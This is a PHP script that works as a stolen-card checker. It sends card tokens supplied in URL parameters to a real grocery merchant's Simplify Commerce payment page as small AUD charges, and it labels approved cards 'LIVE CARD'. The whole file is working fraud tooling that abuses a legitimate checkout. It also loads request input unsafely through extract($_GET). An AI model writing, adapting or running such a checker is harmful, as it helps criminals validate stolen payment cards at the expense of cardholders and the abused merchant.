<?php
sleep(4);
function gst($str, $tite, $salsal){
  $c = explode($tite, $str);
  $d = explode($salsal, $c[1]);
  return $d[0];
}
extract($_GET);
$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, 'https://www.simplify.com/commerce/pay/lvpb_ZGIyN2NkMmItMTZjMy00MzhhLTkzMjktOTZiMjExM2UzZjk1');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);

curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');

$headers = array();
$headers[] = 'Host: www.simplify.com';
$headers[] = 'Origin: https://www.simplify.com';
$headers[] = 'Referer: https://www.simplify.com/commerce/pay/';
$headers[] = 'Content-Type: application/json;charset=UTF-8';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36';
$headers[] = 'Accept: application/json, text/plain, */*';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"hostname":"cucin.com.au","amount":"1220","receipt":false,"currency":"AUD","reference":"11238","description":"CUCIN | Buy Fruits &amp; Vegetables Online | Shop Online &amp; Get Door Delivery","requestToken":"'.$requestToken.'","plan":"","token":"'.$id.'"}');

$raw = curl_exec($ch);
$decoded = json_decode($raw,true);
curl_close($ch);

$declined = $decoded['data']['declineReason'];
if($declined=='APPROVED'){
    echo json_encode(['result' => 'SUCCESS', 'message' => 'LIVE CARD']);
  }else{
    echo json_encode(['result' => 'FAILURE', 'message' => '<span class="badge badge-danger">'.$declined.'</span>' ]);
  }


/*if(strlen($cS) > 2 && $cS != 'AUTHENTICATING'){
  if($cS=='AUTHORIZED'){
    echo json_encode(['result' => 'SUCCESS', 'message' => 'LIVE CARD']);
  }elseif($cS=='PAYMENT_SUCCESS'){
    echo json_encode(['result' => 'SUCCESS', 'message' => 'LIVE CARD']);
  }elseif($cS=='PAYMENT_FAILED'){
    echo json_encode(['result' => 'FAILURE', 'message' => '<span class="badge badge-danger">'.$cS.'</span>' ]);
  }elseif($cS=='AUTH_FAILED'){
    echo json_encode(['result' => 'FAILURE', 'message' => '<span class="badge badge-danger">'.$cS.'</span>' ]);
  }else{
    http_response_code(400);
  }
}else{
  http_response_code(400);
}
*/
?>